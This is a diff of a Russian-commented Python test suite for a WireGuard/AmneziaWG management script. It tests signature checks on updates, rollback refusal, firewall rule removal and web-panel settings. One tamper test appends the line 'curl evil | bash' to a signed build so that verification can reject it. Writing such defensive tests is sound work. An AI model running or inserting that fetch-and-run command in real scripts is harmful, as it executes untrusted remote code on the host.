-# curl, отдающий awg2.sh и awg2.sh.sig «из канала» — файлы из SIG
-with open(os.path.join(SIGBIN, "curl"), "w") as f:
-    f.write(r"""#!/usr/bin/env bash
-out="" url=""
-while (( $# )); do case "$1" in -o) out="$2"; shift 2 ;; http*) url="$1"; shift ;; *) shift ;; esac; done
-url="${url%%\?*}"; src="$SIGSRV/${url##*/}"
-[[ -f "$src" ]] || exit 22
-if [[ -n "$out" ]]; then cp "$src" "$out"; else cat "$src"; fi
-""")
-os.chmod(os.path.join(SIGBIN, "curl"), 0o755)
-subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "test", "-f", os.path.join(TMP, "relkey")], check=True)
-subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "evil", "-f", os.path.join(TMP, "evilkey")], check=True)
-PUB = open(os.path.join(TMP, "relkey.pub")).read().split()
-SIGNERS = f'UPDATE_SIGNERS=("{PUB[0]} {PUB[1]}"); '
+# Подпись проверяет ssh-keygen (openssh-client): без него раздел пропускается,
+# а не роняет весь набор
+if not shutil.which("ssh-keygen"):
+    print("  ПРОПУСК: нет ssh-keygen — поставь openssh-client")
+else:
+    SIG = os.path.join(TMP, "sigsrv")
+    SIGBIN = os.path.join(TMP, "sigbin")
+    os.makedirs(SIG)
+    os.makedirs(SIGBIN)
+    # curl, отдающий awg2.sh и awg2.sh.sig «из канала» — файлы из SIG
+    with open(os.path.join(SIGBIN, "curl"), "w") as f:
+        f.write(r"""#!/usr/bin/env bash
+    out="" url=""
+    while (( $# )); do case "$1" in -o) out="$2"; shift 2 ;; http*) url="$1"; shift ;; *) shift ;; esac; done
+    url="${url%%\?*}"; src="$SIGSRV/${url##*/}"
+    [[ -f "$src" ]] || exit 22
+    if [[ -n "$out" ]]; then cp "$src" "$out"; else cat "$src"; fi
+    """)
+    os.chmod(os.path.join(SIGBIN, "curl"), 0o755)
+    subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "test", "-f", os.path.join(TMP, "relkey")], check=True)
+    subprocess.run(["ssh-keygen", "-q", "-t", "ed25519", "-N", "", "-C", "evil", "-f", os.path.join(TMP, "evilkey")], check=True)
+    PUB = open(os.path.join(TMP, "relkey.pub")).read().split()
+    SIGNERS = f'UPDATE_SIGNERS=("{PUB[0]} {PUB[1]}"); '
 
-def build(ver, key="relkey", sign=True, tamper=False):
-    body = "#!/usr/bin/env bash\nset -uo pipefail\n\nVERSION=\"%s\"\n" % ver + "# заполнитель\n" * 6000 + "echo ok\n"
-    path = os.path.join(SIG, "awg2.sh")
-    with open(path, "w") as f:
-        f.write(body)
-    if os.path.exists(path + ".sig"):
-        os.remove(path + ".sig")
-    if sign:
-        subprocess.run(["ssh-keygen", "-q", "-Y", "sign", "-f", os.path.join(TMP, key), "-n", "awg-toolza", path], check=True)
-    if tamper:
-        with open(path, "a") as f:
-            f.write("curl evil | bash\n")
+    def build(ver, key="relkey", sign=True, tamper=False):
+        body = "#!/usr/bin/env bash\nset -uo pipefail\n\nVERSION=\"%s\"\n" % ver + "# заполнитель\n" * 6000 + "echo ok\n"
+        path = os.path.join(SIG, "awg2.sh")
+        with open(path, "w") as f:
+            f.write(body)
+        if os.path.exists(path + ".sig"):
+            os.remove(path + ".sig")
+        if sign:
+            subprocess.run(["ssh-keygen", "-q", "-Y", "sign", "-f", os.path.join(TMP, key), "-n", "awg-toolza", path], check=True)
+        if tamper:
+            with open(path, "a") as f:
+                f.write("curl evil | bash\n")
 
-def fetch(extra="", auto=1):
-    env = dict(ENV, PATH=SIGBIN + ":" + ENV["PATH"], SIGSRV=SIG)
-    r = subprocess.run(["bash", "-c", PRELUDE + SIGNERS + extra + f"AUTO_MODE={auto}; update_channel_init; update_fetch 2>&1"],
-                       input="", capture_output=True, text=True, env=env, timeout=120)
-    return r.returncode, r.stdout
+    def fetch(extra="", auto=1):
+        env = dict(ENV, PATH=SIGBIN + ":" + ENV["PATH"], SIGSRV=SIG)
+        r = subprocess.run(["bash", "-c", PRELUDE + SIGNERS + extra + f"AUTO_MODE={auto}; update_channel_init; update_fetch 2>&1"],
+                           input="", capture_output=True, text=True, env=env, timeout=120)
+        return r.returncode, r.stdout
 
-build("v9.9.9")
-rc, out = fetch()
-chk("подписанная сборка ставится", rc == 0 and "Подпись сборки верна" in out, out[-400:])
-build("v9.9.9", tamper=True)
-rc, out = fetch()
-chk("сборка, изменённая после подписи, отклоняется", rc != 0 and "не сходится" in out, out[-400:])
-build("v9.9.9", key="evilkey")
-rc, out = fetch()
-chk("подпись чужим ключом отклоняется", rc != 0 and "не сходится" in out, out[-400:])
-build("v9.9.9", sign=False)
-rc, out = fetch()
-chk("новая сборка без подписи отклоняется", rc != 0 and "нет подписи" in out, out[-400:])
-build("v1.1.9", sign=False)
-rc, out = fetch()
-chk("старая сборка без подписи — не из бота и API", rc != 0 and "только из меню" in out, out[-400:])
-rc, out = fetch(auto=0)
-chk("старая сборка без подписи — из меню только после yes", rc != 0 and "до подписей" in out, out[-400:])
-build("v9.9.9")
-rc, out = fetch(extra="UPDATE_SIGNERS=(); ")
-chk("тестовая сборка без ключа — ставит с предупреждением", rc == 0 and "без ключа релизов" in out, out[-400:])
-rc, out, _ = bash('grep -c "ssh-ed25519 AAAA" <<< "$(declare -p UPDATE_SIGNERS)"')
-chk("в сборку вшит ключ релизов", out.strip() == "1", out)
+    build("v9.9.9")
+    rc, out = fetch()
+    chk("подписанная сборка ставится", rc == 0 and "Подпись сборки верна" in out, out[-400:])
+    build("v9.9.9", tamper=True)
+    rc, out = fetch()
+    chk("сборка, изменённая после подписи, отклоняется", rc != 0 and "не сходится" in out, out[-400:])
+    build("v9.9.9", key="evilkey")
+    rc, out = fetch()
+    chk("подпись чужим ключом отклоняется", rc != 0 and "не сходится" in out, out[-400:])
+    build("v9.9.9", sign=False)
+    rc, out = fetch()
+    chk("новая сборка без подписи отклоняется", rc != 0 and "нет подписи" in out, out[-400:])
+    build("v1.1.9", sign=False)
+    rc, out = fetch()
+    chk("старая сборка без подписи — не из бота и API", rc != 0 and "только из меню" in out, out[-400:])
+    rc, out = fetch(auto=0)
+    chk("старая сборка без подписи — из меню только после yes", rc != 0 and "до подписей" in out, out[-400:])
+    build("v9.9.9")
+    rc, out = fetch(extra="UPDATE_SIGNERS=(); ")
+    chk("тестовая сборка без ключа — ставит с предупреждением", rc == 0 and "без ключа релизов" in out, out[-400:])
+    rc, out, _ = bash('grep -c "ssh-ed25519 AAAA" <<< "$(declare -p UPDATE_SIGNERS)"')
+    chk("в сборку вшит ключ релизов", out.strip() == "1", out)
+
+# Откат из бота и панели не ставится и с force: подпись не привязана к версии
+OLDF = os.path.join(TMP, "old-awg2.sh")
+with open(OLDF, "w") as f:
+    f.write('#!/usr/bin/env bash\nVERSION="v1.0.0"\n')
+TGT = os.path.join(TMP, "tgt-awg2")
+with open(TGT, "w") as f:
+    f.write("current\n")
+def rollback(api_mode, force):
+    rc, out, err = bash(f'SCRIPT_PATH="{TGT}"; VERSION=v1.2.2; UPDATE_NEW=v1.0.0; UPDATE_FILE="{OLDF}"; '
+                        f'API_MODE={api_mode}; update_install {force} 2>&1; echo "rc=$?"')
+    return out
+out = rollback(1, "force")
+chk("откат из API с force — отказ, файл не тронут", "rc=1" in out and "только из меню" in out
+    and open(TGT).read() == "current\n", out)
+out = rollback(0, "")
+chk("откат из меню без force — отказ", "rc=1" in out and open(TGT).read() == "current\n", out)
+out = rollback(0, "force")
+chk("откат из меню с force (после yes) — ставится", "rc=0" in out and "v1.0.0" in open(TGT).read(), out)
 
 print("\n── Запуск из распакованного архива ──")
 INST = os.path.join(TMP, "inst")
@@ -1360,6 +1671,26 @@ chk("Enter вместо пароля — сгенерирован и показ�
     out[-500:])
 rc, out, _ = bash(WEBPRE + "printf '%s' 'Пароль 123' | py web-hash")
 chk("хеш пароля: соль каждый раз новая", out.strip().startswith("scrypt$") and out.strip() != conf2["WEB_PASS"], out)
+# Порт панели и её правило в UFW: «awg-web» — не подстрока для «awg-webapp» Mini App
+UFWST = os.path.join(TMP, "ufw-rules")
+with open(UFWST, "w") as f:
+    f.write("8443/tcp ALLOW IN Anywhere # awg-webapp\n41234/tcp ALLOW IN Anywhere # awg-web\n"
+            "51820/udp ALLOW IN Anywhere # AmneziaWG\n41234/tcp (v6) ALLOW IN Anywhere (v6) # awg-web\n")
+UFWFN = ('ufw() { case "$1" in status) awk \'{printf "[%2d] %s\\n", NR, $0}\' "' + UFWST + '" ;; '
+         '--force) sed -i "${3}d" "' + UFWST + '" ;; esac; }; ')
+rc, out, _ = bash(UFWFN + 'ufw_delete_comment awg-web; cat "' + UFWST + '"')
+chk("UFW: правила веб-панели удалены (и v6), порт Mini App «awg-webapp» и AmneziaWG — на месте",
+    out.split("\n")[:2] == ["8443/tcp ALLOW IN Anywhere # awg-webapp", "51820/udp ALLOW IN Anywhere # AmneziaWG"]
+    and "# awg-web\n" not in out, out)
+rc, out, _ = bash(WEBPRE + 'web_port_busy() { return 1; }; web_restart() { :; }; web_show_access() { :; }; '
+                  'web_set_port 2>&1 <<< "010000"; web_conf_get WEB_PORT')
+chk("порт панели с ведущим нулём — десятичный (10000), а не восьмеричный", out.strip().splitlines()[-1] == "10000", out)
+rc, out, _ = bash(WEBPRE + 'web_ask_password 2>&1 <<< "$(printf "%0300d\\n%0300d\\n" 1 1)"; echo "rc=$?"', stdin=None)
+chk("пароль длиннее 256 символов — отказ (вход принимает до 256)", "Не больше 256" in out, out[-300:])
+rc, out, _ = bash(f'BOT_DIR="{TMP}/botcode"; mkdir -p "$BOT_DIR"; '
+                  'web_installed() { true; }; bot_installed && echo BOT || echo NOBOT; '
+                  'web_installed() { false; }; bot_installed && echo BOT || echo NOBOT')
+chk("код для одной веб-панели — ещё не бот; без панели каталог кода — бот (как раньше)", out.split() == ["NOBOT", "BOT"], out)
 rc, out, _ = bash(WEBPRE + "main_menu", stdin="0\n")
 chk("главное меню: пункт w) Веб-панель", "w)" in out and "Веб-панель" in out, out[-600:])
 rc, out, _ = bash(WEBPRE + f'remove_unit() {{ rm -f "{ROOT}/units/$1"; }}; ' + "web_remove quiet 2>&1; ls " + f'"{WEBC}" 2>&1; ls "{ROOT}/units/awg-web.service" 2>&1')
